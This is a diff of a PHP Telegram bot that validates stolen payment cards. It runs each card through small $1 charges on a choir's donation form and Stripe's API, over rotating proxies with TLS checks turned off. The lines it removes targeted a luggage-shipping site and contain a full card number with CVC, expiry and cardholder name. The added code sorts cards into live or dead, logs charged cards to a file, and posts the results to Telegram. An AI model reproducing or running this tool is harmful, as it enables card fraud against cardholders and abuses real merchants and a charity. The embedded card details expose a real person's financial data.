@@ -323,152 +323,408 @@ $type =strtoupper(GetStr($fim, '"type":"', '"'));
 //==================[BIN LOOK-UP-END]======================//
 
 
-  # -------------------- [1 REQ] -------------------#
-  $ch = curl_init();
 
-curl_setopt($ch, CURLOPT_URL, 'https://www.luggagetoship.com/order/ax_charge_order_pay');
+sleep(1);
+    edit_sent_message($chatId, $sent_message_id, "<b>
+
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗖𝗖 ★ <code>$lista</code>
+[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■■■□ 80%🔴
+[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ 81724: Duplicate card exists?
+━━━━━━━━━
+[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username/<code>[$rank]</code>
+ 
+━━━━━━━━━━━━━━━━━━</b>");
+//-------------------Req 2--------------//
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, $socks5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+curl_setopt($ch, CURLOPT_URL, 'https://fhschoirs.com/sponsors/donate-to-us/');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, "order_id=92095");
-curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
-
-$headers = array();
-$headers[] = 'Accept: */*';
-$headers[] = 'Accept-Language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6';
-$headers[] = 'Cache-Control: no-cache';
-$headers[] = 'Connection: keep-alive';
-$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
-$headers[] = 'Cookie: comm100_visitorguid_21799=2e0ddd86-cfd3-4ba6-aaba-196dd44c0ecd; ci_session=3047e0a734155c061ea6e3278dff95abd7bf56c7; __stripe_sid=f30b716b-9429-4ac5-a60f-27d94d1fd539655607; __stripe_mid=fd289972-6223-4864-938b-bc44fcc4faf6140118';
-$headers[] = 'Origin: https://www.luggagetoship.com';
-$headers[] = 'Pragma: no-cache';
-$headers[] = 'Referer: https://www.luggagetoship.com/order/order_processing/92095';
-$headers[] = 'Sec-Fetch-Dest: empty';
-$headers[] = 'Sec-Fetch-Mode: cors';
-$headers[] = 'Sec-Fetch-Site: same-origin';
-$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0';
-$headers[] = 'X-Requested-With: XMLHttpRequest';
-$headers[] = 'Sec-Ch-Ua: ^^Not_A';
-$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
-$headers[] = 'Sec-Ch-Ua-Platform: ^^Windows^^\"\"';
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-
-$result1 = curl_exec($ch);
-if (curl_errno($ch)) {
-    echo 'Error:' . curl_error($ch);
-}
-curl_close($ch);
-
-
-
-
-   $ch = curl_init();
-
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, "time_on_page=697229&pasted_fields=number&guid=119a750e-9494-4efe-b137-e7a49987e99393b097&muid=fd289972-6223-4864-938b-bc44fcc4faf6140118&sid=f30b716b-9429-4ac5-a60f-27d94d1fd539655607&key=pk_live_vDBwegkvQzKsZsPgSnD40s6f&payment_user_agent=stripe.js^%^2F78ef418&card^[number^]=4381086424583789&card^[cvc^]=944&card^[exp_month^]=6&card^[exp_year^]=2027&card^[name^]=Halley+Swann&card^[address_line1^]=15+Driggs+Streets&card^[address_city^]=Driggs&card^[address_zip^]=84342&card^[address_state^]=&card^[address_country^]=AR");
-curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'POST /sponsors/donate-to-us/ h2',
+'Host: fhschoirs.com',
+'cache-control: max-age=0',
+'upgrade-insecure-requests: 1',
+'origin: https://fhschoirs.com',
+'content-type: multipart/form-data; boundary=----WebKitFormBoundarykrdchXIX9TxT1GVA',
+'user-agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36',
+'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+'x-requested-with: com.xbrowser.play',
+'sec-fetch-site: same-origin',
+'sec-fetch-mode: navigate',
+'sec-fetch-user: ?1',
+'sec-fetch-dest: iframe',
+'referer: https://fhschoirs.com/sponsors/donate-to-us/',
+'accept-language: en-IN,en-US;q=0.9,en;q=0.8',
+));
+$r1 = curl_exec($ch);
+$vh = trim(strip_tags(getStr($r1,'{"common":{"form":{"honeypot":{"version_hash":"','"'))); 
+$gkey = trim(strip_tags(getStr($r1,"input type='hidden' class='gform_hidden' name='gform_unique_id' value='","'"))); 
+$hdval = trim(strip_tags(getStr($r1,"<input type='hidden' class='gform_hidden' name='state_6' value='","'")));
+$nonce = trim(strip_tags(getStr($r1,'"create_payment_intent_nonce":"','"'))); 
 
-$headers = array();
-$headers[] = 'Authority: api.stripe.com';
-$headers[] = 'Accept: application/json';
-$headers[] = 'Accept-Language: en-US';
-$headers[] = 'Cache-Control: no-cache';
-$headers[] = 'Content-Type: application/x-www-form-urlencoded';
-$headers[] = 'Origin: https://js.stripe.com';
-$headers[] = 'Pragma: no-cache';
-$headers[] = 'Referer: https://js.stripe.com/';
-$headers[] = 'Sec-Ch-Ua: ^^Not_A';
-$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
-$headers[] = 'Sec-Ch-Ua-Platform: ^^Windows^^\"\"';
-$headers[] = 'Sec-Fetch-Dest: empty';
-$headers[] = 'Sec-Fetch-Mode: cors';
-$headers[] = 'Sec-Fetch-Site: same-site';
-$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0';
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+echo $nonce;
+////////////////////////////===[1ST CURL]
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, $socks5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+//curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'POST /v1/payment_methods h2',
+'Host: api.stripe.com',
+'accept: application/json',
+'user-agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36',
+'content-type: application/x-www-form-urlencoded',
+'origin: https://js.stripe.com',
+'x-requested-with: com.xbrowser.play',
+'sec-fetch-site: same-site',
+'sec-fetch-mode: cors',
+'sec-fetch-dest: empty',
+'referer: https://js.stripe.com/',
+'accept-language: en-IN,en-US;q=0.9,en;q=0.8',
+
+));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+
+////////////////////////////===[1 Req Postfields]
+
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=Badboy+chk&billing_details[address][postal_code]=90023&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F17cd88d5df%3B+stripe-js-v3%2F17cd88d5df%3B+card-element&referrer=https%3A%2F%2Ffhschoirs.com&time_on_page=87684&key=pk_live_tA9jPd8mkSK7R9GsQhdxt4CM00J27jt1nQ');
+
+ $result1 = curl_exec($ch);
+  $l4 = trim(strip_tags(getStr($result1,'"last4": "','"')));
+  $crt = trim(strip_tags(getStr($result1,'"created": "','"')));
+  $brnd = trim(strip_tags(getStr($result1,'"brand": "','"')));
+$id = trim(strip_tags(getStr($result1,'"id": "','"')));
+//$card = trim(strip_tags(getStr($result1,'"card": { "id": "','"')));
+//echo $card;
+$id;
+
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, $socks5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+curl_setopt($ch, CURLOPT_URL, 'https://fhschoirs.com/wp-admin/admin-ajax.php');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'POST /wp-admin/admin-ajax.php h2',
+'Host: fhschoirs.com',
+'accept: application/json, text/javascript, */*; q=0.01',
+'x-requested-with: XMLHttpRequest',
+'user-agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'origin: https://fhschoirs.com',
+'sec-fetch-site: same-origin',
+'sec-fetch-mode: cors',
+'sec-fetch-dest: empty',
+'referer: https://fhschoirs.com/sponsors/donate-to-us/',
+'accept-language: en-IN,en-US;q=0.9,en;q=0.8',
+));
+
+////////////////////////////===[2 Req Postfields]
+
+curl_setopt($ch, CURLOPT_POSTFIELDS,'action=gfstripe_create_payment_intent&nonce='.$nonce.'&payment_method%5Bid%5D='.$id.'&payment_method%5Bobject%5D=payment_method&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcity%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bcountry%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline1%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bline2%5D=&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bpostal_code%5D=90023&payment_method%5Bbilling_details%5D%5Baddress%5D%5Bstate%5D=&payment_method%5Bbilling_details%5D%5Bemail%5D=&payment_method%5Bbilling_details%5D%5Bname%5D=Badboy+chk&payment_method%5Bbilling_details%5D%5Bphone%5D=&payment_method%5Bcard%5D%5Bbrand%5D=visa&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_line1_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Baddress_postal_code_check%5D=&payment_method%5Bcard%5D%5Bchecks%5D%5Bcvc_check%5D=&payment_method%5Bcard%5D%5Bcountry%5D=US&payment_method%5Bcard%5D%5Bexp_month%5D='.$mes.'&payment_method%5Bcard%5D%5Bexp_year%5D='.$ano.'&payment_method%5Bcard%5D%5Bfunding%5D=debit&payment_method%5Bcard%5D%5Bgenerated_from%5D=&payment_method%5Bcard%5D%5Blast4%5D='.$l4.'&payment_method%5Bcard%5D%5Bnetworks%5D%5Bavailable%5D%5B%5D=visa&payment_method%5Bcard%5D%5Bnetworks%5D%5Bpreferred%5D=&payment_method%5Bcard%5D%5Bthree_d_secure_usage%5D%5Bsupported%5D=true&payment_method%5Bcard%5D%5Bwallet%5D=&payment_method%5Bcreated%5D='.$crt.'&payment_method%5Bcustomer%5D=&payment_method%5Blivemode%5D=true&payment_method%5Btype%5D=card&currency=USD&amount=100&feed_id=1');
 
 $result2 = curl_exec($ch);
-if (curl_errno($ch)) {
-    echo 'Error:' . curl_error($ch);
+$pi = trim(strip_tags(getStr($result2,'"id":"','"')));
+$scrt = trim(strip_tags(getStr($result2,'"client_secret":"','"')));
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, $socks5);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+curl_setopt($ch, CURLOPT_URL, 'https://fhschoirs.com/sponsors/donate-to-us/');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'POST /sponsors/donate-to-us/ h2',
+'Host: fhschoirs.com',
+'cache-control: max-age=0',
+'upgrade-insecure-requests: 1',
+'origin: https://fhschoirs.com',
+'content-type: multipart/form-data; boundary=----WebKitFormBoundarykrdchXIX9TxT1GVA',
+'user-agent: Mozilla/5.0 (Linux; Android 11; 220333QBI Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/97.0.4692.98 Mobile Safari/537.36',
+'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+'x-requested-with: com.xbrowser.play',
+'sec-fetch-site: same-origin',
+'sec-fetch-mode: navigate',
+'sec-fetch-user: ?1',
+'sec-fetch-dest: iframe',
+'referer: https://fhschoirs.com/sponsors/donate-to-us/',
+'accept-language: en-IN,en-US;q=0.9,en;q=0.8',
+));
+
+////////////////////////////===[2 Req Postfields]
+
+curl_setopt($ch, CURLOPT_POSTFIELDS,'------WebKitFormBoundarykrdchXIX9TxT1GVA
+Content-Disposition: form-data; name="input_3"
+
+gsixchit@gmail.com
+------WebKitFormBoundarykrdchXIX9TxT1GVA
+Content-Disposition: form-data; name="input_1"
+
+$1.00
+------WebKitFormBoundarykrdchXIX9TxT1GVA
+Content-Disposition: form-data; name="input_2.5"
+
+Badboy chk
+------WebKitFormBoundarykrdchXIX9TxT1GVA
+Content-Disposition: form-data; name="gform_ajax"
+
+form_id=1&title=&description=&tabindex=49
+------WebKitFormBoundarykrdchXIX9TxT1GVA
+Content-Disposition: form-data; name="is_submit_1"
+
+1
+------WebKitFormBoundarykrdchXIX9TxT1GVA
+Content-Disposition: form-data; name="gform_submit"
+
+1
+------WebKitFormBoundarykrdchXIX9TxT1GVA
+Content-Disposition: form-data; name="gform_unique_id"
+
+
+------WebKitFormBoundarykrdchXIX9TxT1GVA
+Content-Disposition: form-data; name="state_1"
+
+WyJbXSIsImZjZjdjN2U2MTYwNzkxNTI0MGE2M2ZiNzRmOWE4NGQ3Il0=
+------WebKitFormBoundarykrdchXIX9TxT1GVA
+Content-Disposition: form-data; name="gform_target_page_number_1"
+
+0
+------WebKitFormBoundarykrdchXIX9TxT1GVA
+Content-Disposition: form-data; name="gform_source_page_number_1"
+
+1
+------WebKitFormBoundarykrdchXIX9TxT1GVA
+Content-Disposition: form-data; name="gform_field_values"
+
+
+------WebKitFormBoundarykrdchXIX9TxT1GVA
+Content-Disposition: form-data; name="stripe_response"
+
+{"id":"'.$pi.'","client_secret":"'.$scrt.'","amount":100}
+------WebKitFormBoundarykrdchXIX9TxT1GVA
+Content-Disposition: form-data; name="stripe_credit_card_last_four"
+
+'.$l4.'
+------WebKitFormBoundarykrdchXIX9TxT1GVA
+Content-Disposition: form-data; name="stripe_credit_card_type"
+
+'.$brnd.'
+------WebKitFormBoundarykrdchXIX9TxT1GVA--');
+
+$result3 = curl_exec($ch);
+$msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));
+
+$msg5 = trim(strip_tags(getStr($result3,'There was a problem with your submission:','.')));
+$msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));
+if(empty($msg))
+{
+  $msg = $msg5;
 }
-curl_close($ch);
-      $result2 = curl_exec($ch);
-      $msg2 = Getstr($result2,'"message": "','"');
+//==================req 2 end===============//
 
-    $end_time = microtime(true);
-  $time = number_format($end_time - $start_time, 2);
-   
-    ////////--[Responses]--////////
 
-      if(strpos($result2, '"status": "succeeded"' )) {
-          bot('editMessageText',[
-              'chat_id'=>$chat_id,
-              'message_id'=>$messageidtoedit,
-              'text'=>"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
-━━━━━━━━━━━━━━━━           
-[†] ᴄᴀʀᴅ <code>$lista</code>
-[†] sᴛᴀᴛᴜs <code>Stripe Auth $1</code>
-[†] ʀᴇsᴘᴏɴsᴇ <code> CVV LIVE </code>
-━━━━━━━━━━━━━━━━
-[†] 𝘽𝘼𝙉𝙆: <code>$bank $brand</code>
-[†] 𝘽𝙧𝙖𝙣𝙙: <code>$scheme </code>
-[†] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔: <code>$name $emoji</code>
-━━━━━━━━━━━━━━━━
-[†] 𝗧𝗶𝗺𝗲 <code> $time seconds </code>
-[†] 𝗣𝗿𝗼𝘅𝘆 <code>$r.XXX.XXX.XX </code>
-[†] 𝗨𝘀𝗲𝗿 @$username <code>[$rank]</code>
-『 𝗕𝗢𝗧 𝗕𝗬  @hexnynejz
-  ",
-              'parse_mode'=>'html',
-              'disable_web_page_preview'=>'true'
-              ]);
-      }
-      elseif((empty($client)) || (empty($pi))) {
-          bot('editMessageText',[
-              'chat_id'=>$chat_id,
-              'message_id'=>$messageidtoedit,
-              'text'=>"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌
-  ━━━━━━━━━━━━━━━━            
-[†] ᴄᴀʀᴅ <code>$lista</code>
-[†] sᴛᴀᴛᴜs Stripe Auth $1
-[†] ʀᴇsᴘᴏɴsᴇ $msg 81724: Duplicate card exists in the vault. 
-  ━━━━━━━━━━━━━━━━
-[†] 𝘽𝘼𝙉𝙆: $bank
-[†] 𝙏𝙮𝙥𝙚: $bin
-[†] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔: $name $emoji
-  ━━━━━━━━━━━━━━━━
-[†] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲  
-[†] 𝗨𝘀𝗲𝗿 @$username <code>[$rank]</code>
-『 𝗕𝗢𝗧 𝗕𝗬 <a href='t.me/hexnynejz'> 🅷🅴🆇🅽🆈🅽🅴🅲🅷🅺
-  </a>━━━━━━━━━━━━━━━━
-  ",
-              'parse_mode'=>'html',
-              'disable_web_page_preview'=>'true'
-              ]);
-      }
-      else {
-          bot('editMessageText',[
-              'chat_id'=>$chat_id,
-              'message_id'=>$messageidtoedit,
-              'text'=>"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌
-━━━━━━━━━━━━━━━━      
-[†] ᴄᴀʀᴅ <code>$lista</code>
-[†] sᴛᴀᴛᴜs <code>Stripe Auth $1</code>
-[†] ʀᴇsᴘᴏɴsᴇ <code>. $msg2 $bin </code>
-━━━━━━━━━━━━━━━━
-[†] 𝘽𝘼𝙉𝙆: <code>$bank $brand </code>
-[†] 𝘽𝙧𝙖𝙣𝙙: <code>$scheme </code>
-[†] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔: <code>$name $emoji</code>
-━━━━━━━━━━━━━━━━
-[†] 𝗧𝗶𝗺𝗲 : <code>$time seconds </code>
-[†] 𝗣𝗿𝗼𝘅𝘆: <code>$r.XXX.XXX.XX </code>
-[†] 𝗨𝘀𝗲𝗿 @$username <code>[$rank]</code>
-『 𝗕𝗢𝗧 𝗕𝗬 <a href='t.me/hexnynejz'> 🅷🅴🆇🅽🆈🅽🅴🅲🅷🅺 </a>
-━━━━━━━━━━━━━━━━
-  ",
-              'parse_mode'=>'html',
-              'disable_web_page_preview'=>'true'
-              ]);
-      }
-  }
-  ?>
+
+sleep(1);
+    edit_sent_message($chatId, $sent_message_id, "<b>
+
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗖𝗖 ★ <code>$lista</code>
+[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■■■■ 99%🟢
+[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ 81724: Duplicate card exists?
+━━━━━━━━━
+[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username/<code>[$rank]</code>
+ 
+━━━━━━━━━━━━━━━━━━</b>");
+$end_time = microtime(true);
+$time = number_format($end_time - $start_time, 2);
+
+  //======checker part end=========//
+
+
+if (
+    strpos($result3, 'Thank you for your membership.') !== false ||
+    strpos($result3, 'Membership confirmed.') !== false ||
+    strpos($result3, 'Membership Confirmation') !== false ||
+    strpos($result3, 'Thanks for your donation! Please check your email for a receipt.') !== false ||
+    strpos($result3, 'incorrect_zip') !== false ||
+    strpos($result3, 'Success ') !== false ||
+    strpos($result3, '"type":"one-time"') !== false ||
+    strpos($result3, '/donations/thank_you?donation_number=') !== false
+) {
+
+  $resp = "<b>
+     Stripe
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗖𝗖 ★ <code>$lista</code>
+[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ <code> Live  </code>
+[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code> Thanks for your donation!. </code>
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
+[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
+[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
+[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
+[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
+[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>
+
+
+</b>";
+
+sleep(1);
+edit_sent_message($chatId, $sent_message_id, $resp);
+file_put_contents('./ccs/charged.txt', $resp . PHP_EOL, FILE_APPEND);
+}
+
+elseif(strpos($result3, "Your card has insufficient funds.") || strpos($result3, "insufficient_funds")) {
+
+
+$resp = "<b>
+     Stripe 
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗖𝗖 ★ <code>$lista</code>
+[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ <code> Live  </code>
+[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code> insufficient funds. </code>
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
+[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
+[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
+[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
+[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
+[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>
+
+
+</b>";
+
+sleep(1);
+edit_sent_message($chatId, $sent_message_id, $resp);
+}
+
+
+elseif(strpos($result3, 'security code is incorrect.') !== false || strpos($result3, 'security code is invalid.') !== false || strpos($result3, "incorrect_cvc") !== false) {
+$resp = "<b>
+    Stripe
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗖𝗖 ★ <code>$lista</code>
+[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ <code> Live  </code>
+[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code> incorrect_cvc </code>
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
+[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
+[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
+[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
+[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
+[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>
+
+
+</b>";
+
+sleep(1);
+edit_sent_message($chatId, $sent_message_id, $resp);
+}
+
+elseif(strpos($result3, "Your card does not support this type of purchase.")) {
+$resp = "<b>
+     Stripe  
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗖𝗖 ★ <code>$lista</code>
+[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ <code> Live  </code>
+[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code> Your card does not support this type of purchase </code>
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
+[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
+[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
+[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
+[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
+[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>
+
+
+</b>";
+sleep(1);
+edit_sent_message($chatId, $sent_message_id, $resp);
+}
+
+elseif(strpos($result3, "stripe_3ds2_fingerprint")) {
+$resp = "<b>
+     Stripe 
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗖𝗖 ★ <code>$lista</code>
+[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ <code> Live  </code>
+[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code> 3D_Req </code>
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
+[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
+[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
+[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
+[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
+[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>
+
+</b>";
+
+sleep(1);
+edit_sent_message($chatId, $sent_message_id, $resp);
+}
+
+
+else {
+$resp = "<b>
+   Stripe Auth
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗖𝗖 ★ <code>$lista</code>
+[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Dead 
+[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>$msg </code>
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ↯<code>$bank</code>
+[↯] 𝗕𝗮𝗻𝗸 ↯ <code>$brand</code>
+[↯] 𝗧𝗬𝗣𝗘 ↯ <code>$type</code>
+[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ <code>$name $emoji</code>
+━━━━━━━━━━━━━━━━━━
+[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code> $r.XXX.XXX.XX Live ✅</code>
